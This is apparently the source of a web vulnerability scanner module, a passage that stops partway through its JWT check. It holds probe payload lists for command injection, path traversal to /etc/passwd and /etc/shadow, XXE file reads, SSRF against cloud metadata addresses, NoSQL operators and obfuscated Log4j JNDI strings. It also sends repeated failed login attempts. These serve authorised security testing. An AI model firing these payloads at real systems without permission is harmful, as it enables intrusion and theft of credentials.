"""
scanner/advanced_checks.py — AWVS v3.0 Advanced Detection Module
──────────────────────────────────────────────────────────────────────────────
Modules:
  1.  Sensitive File & Directory Bruteforce (200+ paths)
  2.  Cookie Security (HttpOnly, Secure, SameSite — ALL cookies)
  3.  SSL/TLS: expiry, cipher strength, protocol version, self-signed
  4.  Dangerous HTTP Methods (PUT, DELETE, TRACE, CONNECT)
  5.  Command Injection (GET + POST + JSON body)
  6.  Path Traversal (all params, not just keyword-matched)
  7.  XXE (probes XML + JSON + form endpoints)
  8.  Broken Auth / Rate Limiting
  9.  CORS Misconfiguration (wildcard, null origin, credential reflection)
  10. JWT Weakness Detection (alg:none, exposed secrets, expired)
  11. SSRF — Server-Side Request Forgery
  12. Host Header Injection
  13. NoSQL Injection (MongoDB operators)
  14. Log4j / JNDI Injection probe
  15. GraphQL Introspection Exposure
  16. WAF Detection & Bypass hints
  17. Subdomain Takeover Indicators
  18. Clickjacking detailed analysis
"""

import json
import logging
import re
import threading
from concurrent.futures import ThreadPoolExecutor
import socket
import ssl
import time
from datetime import datetime, timezone
from urllib.parse import urlparse, urljoin, urlencode, parse_qs, urlunparse

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logger = logging.getLogger(__name__)

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AWVS/3.0 (Authorized Security Testing)"
REQUEST_HEADERS = {"User-Agent": UA}

# ─────────────────────────────────────────────────────────────────────────────
# SENSITIVE PATHS  (200+ paths — expanded from v2)
# ─────────────────────────────────────────────────────────────────────────────
SENSITIVE_PATHS = [
    # Source control
    "/.git/config", "/.git/HEAD", "/.git/COMMIT_EDITMSG", "/.git/index",
    "/.git/logs/HEAD", "/.svn/entries", "/.hg/hgrc", "/.bzr/branch/format",
    # Environment & config
    "/.env", "/.env.local", "/.env.backup", "/.env.production", "/.env.development",
    "/.env.staging", "/.env.test", "/config.php", "/config.yml", "/config.yaml",
    "/config.json", "/config.ini", "/configuration.php", "/settings.py",
    "/settings.php", "/local.xml", "/app.config", "/web.config",
    "/application.properties", "/application.yml", "/database.yml",
    # WordPress
    "/wp-config.php", "/wp-config.php.bak", "/wp-config.php.old",
    "/wp-login.php", "/wp-admin/", "/wp-includes/",
    "/xmlrpc.php", "/wp-json/wp/v2/users",
    # Backup files
    "/backup.zip", "/backup.tar.gz", "/backup.sql", "/dump.sql",
    "/db.sql", "/database.sql", "/site.zip", "/www.zip",
    "/backup/", "/backups/", "/old/", "/bak/",
    # Admin panels
    "/admin", "/admin/", "/admin.php", "/admin.html", "/administrator",
    "/admin/login", "/admin/dashboard", "/manage", "/management",
    "/cpanel", "/plesk", "/webadmin", "/siteadmin",
    # Database admin
    "/phpmyadmin", "/phpmyadmin/", "/mysql", "/adminer.php",
    "/myadmin/", "/phpmyadmin/index.php", "/dbadmin/",
    # Debug / info pages
    "/phpinfo.php", "/info.php", "/test.php", "/_profiler",
    "/debug", "/debug/", "/console", "/_debug_toolbar",
    "/trace", "/metrics", "/health", "/healthz", "/ping", "/status",
    # Server status
    "/server-status", "/server-info", "/nginx_status", "/stub_status",
    # API endpoints
    "/api/v1/users", "/api/v1/admin", "/api/v2/users", "/api/users",
    "/api/config", "/api/settings", "/api/keys", "/api/debug",
    "/api/graphql", "/graphql", "/graphiql", "/playground",
    # Docs / specs
    "/swagger.json", "/swagger-ui.html", "/swagger-ui/", "/openapi.json",
    "/openapi.yaml", "/api-docs", "/api-docs/", "/v2/api-docs",
    "/redoc", "/docs/",
    # Spring Boot Actuator
    "/actuator", "/actuator/env", "/actuator/health", "/actuator/info",
    "/actuator/beans", "/actuator/mappings", "/actuator/metrics",
    "/actuator/loggers", "/actuator/trace", "/actuator/dump",
    # AWS / Cloud metadata
    "/latest/meta-data/", "/?url=http://169.254.169.254/",
    # Common sensitive files
    "/robots.txt", "/sitemap.xml", "/.htaccess", "/.htpasswd",
    "/.DS_Store", "/Thumbs.db", "/crossdomain.xml", "/clientaccesspolicy.xml",
    "/browserconfig.xml", "/.well-known/security.txt",
    # Source code
    "/index.php.bak", "/index.html.bak", "/index.bak",
    "/index.php~", "/login.php~", "/app.py.bak",
    # Logs
    "/logs/", "/log/", "/error.log", "/access.log",
    "/var/log/", "/debug.log", "/application.log",
    # Package managers
    "/package.json", "/package-lock.json", "/yarn.lock",
    "/composer.json", "/composer.lock", "/Gemfile", "/requirements.txt",
    "/Dockerfile", "/docker-compose.yml", "/.dockerenv",
    # Node.js
    "/node_modules/", "/.npmrc", "/.yarnrc",
    # CI/CD
    "/.travis.yml", "/.circleci/config.yml", "/.github/workflows/",
    "/Jenkinsfile", "/.gitlab-ci.yml",
    # Editors
    "/.idea/", "/.vscode/", "/.project",
]

# ─────────────────────────────────────────────────────────────────────────────
# PAYLOADS
# ─────────────────────────────────────────────────────────────────────────────
CMD_PAYLOADS = [
    "; echo AWVS_CMD_PROBE",   "| echo AWVS_CMD_PROBE",
    "&& echo AWVS_CMD_PROBE",  "$(echo AWVS_CMD_PROBE)",
    "`echo AWVS_CMD_PROBE`",   "'; echo AWVS_CMD_PROBE;'",
    "\"; echo AWVS_CMD_PROBE;\"",
]
CMD_MARKER = "AWVS_CMD_PROBE"

PATH_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "../../../../windows/system32/drivers/etc/hosts",
    "../../../../windows/win.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "/etc/passwd",
    "/etc/shadow",
    "C:\\Windows\\win.ini",
]
PATH_MARKERS = [
    "root:x:", "daemon:", "bin:x:", "/bin/bash",
    "[boot loader]", "[operating systems]",
    "for 16-bit app support", "127.0.0.1",
]

XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ELEMENT data ANY><!ENTITY xxe SYSTEM "file:///etc/hosts">]><data>&xxe;</data>',
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
]
XXE_MARKERS = ["root:x:", "daemon:", "/bin/bash", "127.0.0.1", "localhost"]

DANGEROUS_METHODS = ["PUT", "DELETE", "TRACE", "CONNECT", "PATCH", "OPTIONS"]

# SSRF payloads
SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",         # AWS IMDS
    "http://metadata.google.internal/computeMetadata/", # GCP
    "http://169.254.169.254/metadata/instance",         # Azure IMDS
    "http://localhost/admin",
    "http://127.0.0.1/admin",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://localtest.me/",
]
SSRF_PARAMS = [
    "url", "uri", "src", "href", "link", "path", "file", "fetch",
    "load", "proxy", "endpoint", "webhook", "callback", "target",
    "domain", "host", "ip", "addr", "address", "site", "feed",
    "page", "data", "to", "from", "resource", "img", "image",
]
SSRF_INDICATORS = [
    "ami-id", "instance-id", "instance-type", "local-hostname",
    "169.254", "metadata", "computeMetadata", "x-metadata-token",
]

# NoSQL Injection (MongoDB)
NOSQL_PAYLOADS = [
    '{"$gt": ""}', '{"$ne": null}', '{"$where": "1==1"}',
    '{"$regex": ".*"}', '{"$exists": true}',
]
NOSQL_PARAMS_PATTERN = r'\[\$'  # param[$gt]=

# Log4j / JNDI
LOG4J_PAYLOAD = "${jndi:ldap://log4j.awvs.probe.local/test}"
LOG4J_PAYLOADS = [
    "${jndi:ldap://log4j.awvs.probe.local/test}",
    "${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://log4j.awvs.probe.local/test}",
    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://log4j.awvs.probe.local/test}",
]

# Subdomain takeover fingerprints
TAKEOVER_FINGERPRINTS = {
    "github": ["There isn't a GitHub Pages site here"],
    "heroku": ["No such app", "herokucdn"],
    "shopify": ["Sorry, this shop is currently unavailable"],
    "tumblr": ["There's nothing here"],
    "wordpress": ["Do you want to register"],
    "fastly": ["Fastly error: unknown domain"],
    "pantheon": ["The gods are wise, but do not know"],
    "azure": ["404 Web Site not found"],
    "amazon": ["NoSuchBucket", "The specified bucket does not exist"],
    "bitbucket": ["Repository not found"],
    "ghost": ["The thing you were looking for is no longer here"],
    "surge": ["project not found"],
}

# GraphQL introspection
GRAPHQL_INTROSPECT_QUERY = '{"query":"{__schema{types{name}}}"}'

# Host Header Injection
HOST_INJECT_PAYLOADS = [
    "evil.example.com",
    "evil.example.com:80",
    "localhostevil.example.com",
]


# ─────────────────────────────────────────────────────────────────────────────
# ADVANCED SCANNER CLASS
# ─────────────────────────────────────────────────────────────────────────────
class AdvancedScanner:
    """
    AWVS v3.0 Advanced vulnerability detection — 18 modules.
    """

    def __init__(self, base_url: str, crawl_data: list, options: dict = None,
                 progress_callback=None, timeout: int = 10):
        self.base_url  = base_url
        self.crawl_data = crawl_data
        self.options   = options or {}
        self.progress  = progress_callback or (lambda msg: None)
        self.timeout   = timeout
        self.findings: list = []
        self._seen: set = set()

        self._lock = threading.Lock()
        self._local = threading.local()

    @property
    def session(self):
        if not hasattr(self._local, "session"):
            sess = requests.Session()
            sess.headers.update(REQUEST_HEADERS)
            sess.verify = False
            sess.max_redirects = 3
            self._local.session = sess
        return self._local.session

    # ── UTILITIES ─────────────────────────────────────────────────────────────
    def _add(self, vuln_type, severity, url, description,
             evidence="", parameter="", payload="", remediation="", cwe=""):
        with self._lock:
            key = f"{vuln_type}|{url}|{parameter}|{payload[:30]}"
            if key in self._seen:
                return
            self._seen.add(key)
            self.findings.append({
            "vuln_type":   vuln_type,
            "severity":    severity,
            "url":         url,
            "description": description,
            "evidence":    (evidence or "")[:600],
            "parameter":   parameter,
            "payload":     payload,
            "remediation": remediation,
            "cwe_id":      cwe,
        })
        self.progress(f"  [ADV][{severity}] {vuln_type} @ {url}")

    def _get(self, url, headers=None, **kw):
        try:
            h = dict(REQUEST_HEADERS)
            if headers:
                h.update(headers)
            return self.session.get(url, headers=h, timeout=self.timeout,
                                    allow_redirects=False, **kw)
        except Exception:
            return None

    def _post(self, url, data=None, json_data=None, headers=None, **kw):
        try:
            h = dict(REQUEST_HEADERS)
            if headers:
                h.update(headers)
            if json_data is not None:
                h["Content-Type"] = "application/json"
                return self.session.post(url, json=json_data, headers=h,
                                         timeout=self.timeout, **kw)
            return self.session.post(url, data=data, headers=h,
                                     timeout=self.timeout, **kw)
        except Exception:
            return None

    def _inject_param(self, parsed, param, payload):
        params = {k: v[0] for k, v in parse_qs(parsed.query).items()}
        params[param] = payload
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                           parsed.params, urlencode(params), ""))

    # ── 1. SENSITIVE FILE BRUTEFORCE ──────────────────────────────────────────
    def scan_sensitive_files(self):
        self.progress("  [ADV] Scanning sensitive files & directories...")
        parsed  = urlparse(self.base_url)
        base    = f"{parsed.scheme}://{parsed.netloc}"
        checked = 0

        lock = threading.Lock()
        def check_path(path):
            nonlocal checked
            url = base + path
            resp = self._get(url)
            if not resp:
                return

            if resp.status_code in (200, 206):
                content_len = len(resp.content)
                if content_len < 10:
                    return

                # Classify severity
                if any(k in path for k in [".env", ".git", "wp-config", "config.php",
                                            "backup", "dump.sql", "db.sql", "private"]):
                    severity = "Critical"
                elif any(k in path for k in ["admin", "phpinfo", "info.php", "actuator/env",
                                              "package.json", "requirements.txt", "Dockerfile"]):
                    severity = "High"
                else:
                    severity = "Medium"

                # Check for real content (not custom 200 for everything)
                snippet = resp.text[:300] if resp.text else ""
                if re.search(r"(404|not found|page not found)", snippet, re.I) and len(snippet) < 500:
                    return

                self._add(
                    "Sensitive File Exposed", severity, url,
                    f"Sensitive path '{path}' returned HTTP {resp.status_code}. "
                    "This may expose source code, credentials, backup data, or configuration.",
                    evidence=f"HTTP {resp.status_code}, {content_len}B — {snippet[:150]}",
                    remediation=(
                        "Block access to sensitive paths via server config. "
                        "Move config files outside web root. "
                        "Add to .gitignore. Use secrets manager for credentials."
                    ),
                    cwe="CWE-200",
                )
            with lock:
                checked += 1
                if checked % 30 == 0:
                    self.progress(f"  [ADV] Checked {checked}/{len(SENSITIVE_PATHS)} paths...")

        with ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(check_path, SENSITIVE_PATHS)

    # ── 2. COOKIE SECURITY — ALL COOKIES ─────────────────────────────────────
    def scan_cookie_security(self):
        self.progress("  [ADV] Analysing cookie security flags...")
        resp = self._get(self.base_url)
        if not resp:
            return

        # Get ALL Set-Cookie headers (requests stores them in resp.cookies + raw headers)
        raw_cookies = resp.raw.headers.getlist("Set-Cookie") if hasattr(resp.raw, 'headers') else []

        # Fallback: parse from resp.headers which only has last Set-Cookie
        all_cookie_strs = raw_cookies if raw_cookies else []
        if not all_cookie_strs and "set-cookie" in resp.headers:
            all_cookie_strs = [resp.headers["set-cookie"]]

        # Also check session cookies from the session jar
        for cookie in self.session.cookies:
            name   = cookie.name
            secure = cookie.secure
            http_only = getattr(cookie, '_rest', {}).get('HttpOnly') is not None

            if not secure:
                self._add(
                    "Insecure Cookie: Missing Secure Flag", "High",
                    self.base_url,
                    f"Cookie '{name}' is missing the Secure flag. "
                    "It can be transmitted over unencrypted HTTP connections.",
                    evidence=f"Cookie: {name}",
                    remediation="Set Secure flag on all cookies: Set-Cookie: name=val; Secure",
                    cwe="CWE-614",
                )
            if not http_only:
                self._add(
                    "Insecure Cookie: Missing HttpOnly Flag", "High",
                    self.base_url,
                    f"Cookie '{name}' is missing the HttpOnly flag. "
                    "JavaScript can read this cookie — enabling session theft via XSS.",
                    evidence=f"Cookie: {name}",
                    remediation="Set HttpOnly flag: Set-Cookie: name=val; HttpOnly",
                    cwe="CWE-1004",
                )

        # Parse raw Set-Cookie headers for SameSite
        for cookie_str in all_cookie_strs:
            name_part = cookie_str.split(";")[0].split("=")[0].strip()
            lc = cookie_str.lower()

            if "httponly" not in lc:
                self._add(
                    "Insecure Cookie: Missing HttpOnly Flag", "High",
                    self.base_url,
                    f"Cookie '{name_part}' missing HttpOnly — vulnerable to XSS-based session theft.",
                    evidence=f"Set-Cookie: {cookie_str[:200]}",
                    remediation="Add HttpOnly to all session cookies.",
                    cwe="CWE-1004",
                )
            if "secure" not in lc:
                self._add(
                    "Insecure Cookie: Missing Secure Flag", "High",
                    self.base_url,
                    f"Cookie '{name_part}' missing Secure flag — transmittable over HTTP.",
                    evidence=f"Set-Cookie: {cookie_str[:200]}",
                    remediation="Add Secure flag to all cookies.",
                    cwe="CWE-614",
                )
            if "samesite" not in lc:
                self._add(
                    "Insecure Cookie: Missing SameSite", "Medium",
                    self.base_url,
                    f"Cookie '{name_part}' missing SameSite — vulnerable to CSRF attacks.",
                    evidence=f"Set-Cookie: {cookie_str[:200]}",
                    remediation="Set SameSite=Strict or SameSite=Lax on all cookies.",
                    cwe="CWE-352",
                )
            elif "samesite=none" in lc and "secure" not in lc:
                self._add(
                    "Insecure Cookie: SameSite=None without Secure", "High",
                    self.base_url,
                    f"Cookie '{name_part}' has SameSite=None but missing Secure. "
                    "Modern browsers will reject this — and it allows cross-site transmission.",
                    evidence=f"Set-Cookie: {cookie_str[:200]}",
                    remediation="Add Secure flag when using SameSite=None.",
                    cwe="CWE-614",
                )

    # ── 3. SSL/TLS ANALYSIS ───────────────────────────────────────────────────
    def scan_ssl(self):
        parsed = urlparse(self.base_url)
        if parsed.scheme != "https":
            self._add(
                "No HTTPS", "High", self.base_url,
                "Site is served over plain HTTP. All traffic is unencrypted and vulnerable to interception.",
                remediation="Deploy SSL/TLS certificate. Enforce HTTPS with HSTS.",
                cwe="CWE-319",
            )
            return

        self.progress("  [ADV] Checking SSL/TLS configuration...")
        host = parsed.hostname
        port = parsed.port or 443

        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = True
            ctx.verify_mode = ssl.CERT_REQUIRED

            with socket.create_connection((host, port), timeout=self.timeout) as sock:
                with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                    cert    = ssock.getpeercert()
                    cipher  = ssock.cipher()   # (name, protocol, bits)
                    proto   = ssock.version()  # TLSv1.2, TLSv1.3

            # Certificate expiry
            not_after_str = cert.get("notAfter", "")
            if not_after_str:
                not_after = datetime.strptime(not_after_str, "%b %d %H:%M:%S %Y %Z")
                not_after = not_after.replace(tzinfo=timezone.utc)
                days_left = (not_after - datetime.now(timezone.utc)).days

                if days_left < 0:
                    self._add(
                        "SSL Certificate: Expired", "Critical", self.base_url,
                        f"SSL certificate expired {abs(days_left)} days ago ({not_after_str}). "
                        "Browsers will show security warnings and block users.",
                        evidence=f"notAfter: {not_after_str}",
                        remediation="Renew certificate immediately. Use Let's Encrypt for auto-renewal.",
                        cwe="CWE-295",
                    )
                elif days_left < 30:
                    self._add(
                        "SSL Certificate: Expiring Soon", "High", self.base_url,
                        f"SSL certificate expires in {days_left} days ({not_after_str}).",
                        evidence=f"notAfter: {not_after_str}, Days remaining: {days_left}",
                        remediation="Renew SSL certificate immediately.",
                        cwe="CWE-295",
                    )

            # TLS version checks
            if proto in ("TLSv1", "TLSv1.1", "SSLv2", "SSLv3"):
                self._add(
                    f"Weak TLS Version: {proto}", "High", self.base_url,
                    f"Server supports deprecated TLS protocol version {proto}. "
                    "This version has known vulnerabilities (POODLE, BEAST).",
                    evidence=f"Negotiated: {proto}",
                    remediation="Disable TLS 1.0 and 1.1. Only allow TLS 1.2 and TLS 1.3.",
                    cwe="CWE-326",
                )

            # Weak cipher check
            if cipher:
                cipher_name, _, key_bits = cipher
                weak_ciphers = ["RC4", "DES", "3DES", "NULL", "EXPORT", "anon", "MD5", "RC2"]
                for wc in weak_ciphers:
                    if wc.lower() in cipher_name.lower():
                        self._add(
                            f"Weak SSL Cipher: {cipher_name}", "High", self.base_url,
                            f"Server negotiated weak cipher suite '{cipher_name}'. "
                            "This cipher is cryptographically broken and enables traffic decryption.",
                            evidence=f"Cipher: {cipher_name}, Bits: {key_bits}",
                            remediation="Configure server to use AEAD ciphers only (AES-GCM, CHACHA20-POLY1305).",
                            cwe="CWE-326",
                        )
                        break
                if key_bits and key_bits < 128:
                    self._add(
                        "Weak Key Length", "High", self.base_url,
                        f"SSL key length {key_bits} bits is below minimum secure length (128 bits).",
                        evidence=f"Key bits: {key_bits}",
                        remediation="Use minimum 128-bit key (256-bit preferred with AES-256-GCM).",
                        cwe="CWE-326",
                    )

        except ssl.SSLCertVerificationError as e:
            self._add(
                "SSL: Certificate Verification Failed", "High", self.base_url,
                f"SSL certificate verification failed: {e}. "
                "May indicate self-signed certificate, untrusted CA, or hostname mismatch.",
                evidence=str(e),
                remediation="Use a certificate from a trusted CA (e.g., Let's Encrypt).",
                cwe="CWE-295",
            )
        except ssl.SSLError as e:
            self._add(
                "SSL Handshake Error", "Medium", self.base_url,
                f"SSL handshake error: {e}",
                evidence=str(e),
                remediation="Review SSL configuration. Check for protocol/cipher mismatches.",
                cwe="CWE-326",
            )
        except Exception as e:
            logger.debug(f"SSL check error: {e}")

    # ── 4. HTTP METHOD TESTING ────────────────────────────────────────────────
    def scan_http_methods(self):
        self.progress("  [ADV] Testing dangerous HTTP methods...")
        for method in DANGEROUS_METHODS:
            try:
                resp = self.session.request(method, self.base_url,
                                             timeout=self.timeout, verify=False)
                if resp.status_code not in (405, 501, 400, 403):
                    sev = "High" if method in ("PUT", "DELETE") else "Medium"
                    self._add(
                        f"HTTP Method Allowed: {method}", sev, self.base_url,
                        f"HTTP {method} method is accepted (status {resp.status_code}). "
                        f"{'Allows file upload/modification.' if method in ('PUT',) else ''}"
                        f"{'Allows resource deletion.' if method == 'DELETE' else ''}"
                        f"{'TRACE enables XST (Cross-Site Tracing) attacks.' if method == 'TRACE' else ''}",
                        evidence=f"{method} {self.base_url} → HTTP {resp.status_code}",
                        remediation=(
                            f"Disable HTTP {method} in server config. "
                            "Allow only GET, POST, HEAD in production."
                        ),
                        cwe="CWE-16",
                    )
            except Exception:
                pass
            time.sleep(0.05)

    # ── 5. COMMAND INJECTION ──────────────────────────────────────────────────
    def scan_command_injection(self):
        self.progress("  [ADV] Testing command injection...")
        for page in self.crawl_data:
            url    = page.get("url", "")
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            # GET params
            for param in params:
                for payload in CMD_PAYLOADS[:4]:
                    test_url = self._inject_param(parsed, param, payload)
                    resp = self._get(test_url)
                    if resp and CMD_MARKER in resp.text:
                        self._add(
                            "Command Injection", "Critical", url,
                            f"Command injection in GET parameter '{param}'. "
                            "OS commands executed server-side.",
                            evidence=f"Marker '{CMD_MARKER}' in response.",
                            parameter=param, payload=payload,
                            remediation="Never pass user input to system commands. Use safe APIs.",
                            cwe="CWE-78",
                        )
                        break
                    time.sleep(0.04)

            # POST forms
            for form in page.get("forms", []):
                if form.get("method", "GET").upper() != "POST":
                    continue
                action = urljoin(url, form.get("action") or url)
                for field in form.get("inputs", []):
                    fname = field.get("name")
                    if not fname:
                        continue
                    for payload in CMD_PAYLOADS[:3]:
                        data = {i.get("name",""): i.get("value","test")
                                for i in form.get("inputs",[]) if i.get("name")}
                        data[fname] = payload
                        resp = self._post(action, data=data)
                        if resp and CMD_MARKER in resp.text:
                            self._add(
                                "Command Injection (Form)", "Critical", url,
                                f"Command injection in POST form field '{fname}'.",
                                evidence=f"Marker detected in response.",
                                parameter=fname, payload=payload,
                                remediation="Sanitize form inputs. Use subprocess with list args.",
                                cwe="CWE-78",
                            )
                            break
                        time.sleep(0.04)

    # ── 6. PATH TRAVERSAL ─────────────────────────────────────────────────────
    def scan_path_traversal(self):
        self.progress("  [ADV] Testing path traversal...")
        for page in self.crawl_data:
            url    = page.get("url", "")
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            if not params:
                continue

            # Test ALL params (not just keyword-filtered ones)
            for param in params:
                for payload in PATH_PAYLOADS[:5]:
                    test_url = self._inject_param(parsed, param, payload)
                    resp = self._get(test_url)
                    if not resp:
                        continue
                    for marker in PATH_MARKERS:
                        if marker in resp.text:
                            self._add(
                                "Path Traversal", "Critical", url,
                                f"Path traversal in parameter '{param}'. "
                                "Sensitive system files readable via ../ sequences.",
                                evidence=f"Marker '{marker}' found with payload '{payload}'.",
                                parameter=param, payload=payload,
                                remediation=(
                                    "Use os.path.realpath() and verify base dir. "
                                    "Reject paths containing ../ or encoded variants."
                                ),
                                cwe="CWE-22",
                            )
                            break
                    time.sleep(0.04)

    # ── 7. XXE — EXPANDED ─────────────────────────────────────────────────────
    def scan_xxe(self):
        self.progress("  [ADV] Testing XXE injection...")
        xxe_headers = {
            "Content-Type": "application/xml",
            "Accept": "application/xml, text/xml, */*",
        }

        # Test base URL + any form actions
        endpoints = {self.base_url}
        for page in self.crawl_data:
            for form in page.get("forms", []):
                action = urljoin(page.get("url", ""), form.get("action") or page.get("url", ""))
                endpoints.add(action)

        for url in list(endpoints)[:10]:
            for xxe_payload in XXE_PAYLOADS[:2]:
                resp = self._post(url, json_data=None,
                                  headers=xxe_headers,
                                  data=xxe_payload)
                if not resp:
                    continue
                for marker in XXE_MARKERS:
                    if marker in resp.text:
                        self._add(
                            "XXE — XML External Entity Injection", "Critical", url,
                            "XXE injection successful. External XML entities are processed, "
                            "enabling file read, SSRF, and denial of service.",
                            evidence=f"Marker '{marker}' in response. XXE payload processed.",
                            payload=xxe_payload[:120],
                            remediation=(
                                "Disable external entity processing. "
                                "Use defusedxml library. Set XMLParser resolve_entities=False."
                            ),
                            cwe="CWE-611",
                        )
                        break
                time.sleep(0.05)

    # ── 8. BROKEN AUTH / RATE LIMITING ────────────────────────────────────────
    def scan_broken_auth(self):
        self.progress("  [ADV] Testing rate limiting & auth security...")
        # Find login form
        login_url = None
        login_data = None

        for page in self.crawl_data:
            url = page.get("url", "")
            if not re.search(r"login|signin|auth|session", url, re.I):
                continue
            for form in page.get("forms", []):
                if form.get("method", "GET").upper() == "POST":
                    inputs = form.get("inputs", [])
                    has_pass = any(
                        i.get("type", "") == "password" or
                        re.search(r"pass|pwd", i.get("name", ""), re.I)
                        for i in inputs
                    )
                    if has_pass:
                        login_url = urljoin(url, form.get("action") or url)
                        login_data = {
                            i.get("name", ""): (
                                "wrongpassword123" if re.search(r"pass|pwd", i.get("name",""), re.I)
                                else i.get("value", "testuser")
                            )
                            for i in inputs if i.get("name")
                        }
                        break
            if login_url:
                break

        if not login_url:
            # Try common login paths
            parsed = urlparse(self.base_url)
            for path in ["/login", "/signin", "/auth/login", "/api/login"]:
                login_url = f"{parsed.scheme}://{parsed.netloc}{path}"
                resp = self._get(login_url)
                if resp and resp.status_code == 200:
                    login_data = {"username": "awvs_test", "password": "wrongpass"}
                    break

        if not login_url or not login_data:
            return

        # Rapid fire 10 requests
        rate_limited = False
        statuses = []
        for _ in range(10):
            resp = self._post(login_url, data=login_data)
            if resp:
                statuses.append(resp.status_code)
                if resp.status_code == 429 or "too many" in resp.text.lower():
                    rate_limited = True
                    break
            time.sleep(0.1)

        if not rate_limited:
            self._add(
                "Missing Rate Limiting on Login", "High", login_url,
                "Login endpoint does not implement rate limiting. "
                "Brute-force and credential stuffing attacks are possible.",
                evidence=f"10 rapid requests — statuses: {statuses}. No 429 received.",
                remediation=(
                    "Implement rate limiting: max 5 attempts/min per IP. "
                    "Add account lockout. Deploy CAPTCHA after 3 failures. "
                    "Use Flask-Limiter or similar middleware."
                ),
                cwe="CWE-307",
            )

    # ── 9. CORS MISCONFIGURATION ──────────────────────────────────────────────
    def scan_cors(self):
        self.progress("  [ADV] Testing CORS configuration...")
        test_origins = [
            "https://evil.example.com",
            "null",
            "https://attacker.com",
            f"https://{urlparse(self.base_url).hostname}.evil.com",
        ]

        for origin in test_origins:
            resp = self._get(self.base_url, headers={"Origin": origin})
            if not resp:
                continue
            acao = resp.headers.get("Access-Control-Allow-Origin", "")
            acac = resp.headers.get("Access-Control-Allow-Credentials", "").lower()

            if acao == "*":
                self._add(
                    "CORS: Wildcard Origin Allowed", "High", self.base_url,
                    "CORS Access-Control-Allow-Origin: * allows any origin to make requests. "
                    "Combined with sensitive APIs, this enables cross-site data theft.",
                    evidence=f"Origin: {origin} → ACAO: {acao}",
                    remediation=(
                        "Restrict CORS to specific trusted origins. "
                        "Never use * with credentials. Validate Origin against whitelist."
                    ),
                    cwe="CWE-942",
                )
            elif acao == origin:
                # Origin is reflected — test with credentials
                if acac == "true":
                    self._add(
                        "CORS: Arbitrary Origin Reflected with Credentials", "Critical",
                        self.base_url,
                        f"CORS reflects arbitrary origin '{origin}' AND allows credentials. "
                        "Attackers can perform cross-origin requests with victim cookies.",
                        evidence=f"ACAO: {acao}, ACAC: {acac}",
                        remediation=(
                            "Never reflect arbitrary Origin headers. "
                            "Use a strict Origin whitelist. "
                            "Do not set ACAC: true with arbitrary origins."
                        ),
                        cwe="CWE-942",
                    )
                else:
                    self._add(
                        "CORS: Origin Reflection", "Medium", self.base_url,
                        f"CORS reflects the attacker-controlled origin '{origin}'. "
                        "May enable cross-origin reading of responses.",
                        evidence=f"ACAO: {acao}",
                        remediation="Validate Origin against explicit whitelist. Do not reflect dynamically.",
                        cwe="CWE-942",
                    )

            if acao == "null":
                self._add(
                    "CORS: Null Origin Allowed", "High", self.base_url,
                    "CORS allows 'null' origin. Sandboxed iframes and redirected requests "
                    "have 'null' origin — this enables CSRF from local HTML files.",
                    evidence=f"ACAO: null, Origin: null tested",
                    remediation="Do not whitelist 'null' origin. Use explicit domain whitelist.",
                    cwe="CWE-942",
                )
            time.sleep(0.05)

    # ── 10. JWT WEAKNESS DETECTION ────────────────────────────────────────────
    def scan_jwt(self):
        self.progress("  [ADV] Analysing JWT tokens...")
        # Look for JWTs in cookies, Authorization headers, and response bodies
        resp = self._get(self.base_url)
        if not resp:
            return

        jwt_regex = r'eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]*'
        sources = {
            "response_body":    resp.text,
            "response_cookies": "; ".join(f"{c.name}={c.value}" for c in self.session.cookies),
        }

        for source, text in sources.items():
            tokens = re.findall(jwt_regex, text)
            for token in tokens[:3]:
                parts = token.split(".")
                if len(parts) != 3:
                    continue
                try:
                    import base64
                    # Decode header (pad to multiple of 4)
                    header_b64 = parts[0] + "=" * (-len(parts[0]) % 4)
                    header = json.loads(base64.urlsafe_b64decode(header_b64))
                    alg = header.get("alg", "").upper()

                    # Check alg:none
                    if alg in ("NONE", ""):
                        self._add(
                            "JWT: Algorithm 'none' Accepted", "Critical",
                            self.base_url,
                            "JWT uses alg:none — signature verification is disabled. "
                            "Attackers can forge any JWT without knowing the secret.",
                            evidence=f"Token header: {header}, Source: {source}",
                            remediation=(
                                "Reject JWTs with alg:none. "
                                "Use HS256 or RS256. Enforce algorithm whitelist on server."
                            ),
                            cwe="CWE-345",
                        )

                    # Weak symmetric algorithm
                    if alg in ("HS256", "HS384", "HS512"):
                        self._add(
                            "JWT: Symmetric Algorithm (HS256)", "Low",
                            self.base_url,
                            f"JWT uses symmetric algorithm {alg}. "
                            "If the secret is weak or leaked, all tokens can be forged.",
                            evidence=f"alg: {alg}, Source: {source}",
                            remediation=(
                                "Use RS256 or ES256 (asymmetric). "
                                "If using HS256, ensure secret is 256-bit random."
                            ),
                            cwe="CWE-327",
                        )

                    # Decode payload to check expiry
                    payload_b64 = parts[1] + "=" * (-len(parts[1]) % 4)
                    payload = json.loads(base64.urlsafe_b64decode(payload_b64))
                    exp = payload.get("exp")
                    if exp:
                        if datetime.utcnow().timestamp() > exp:
                            self._add(
                                "JWT: Expired Token Accepted", "High",
                                self.base_url,
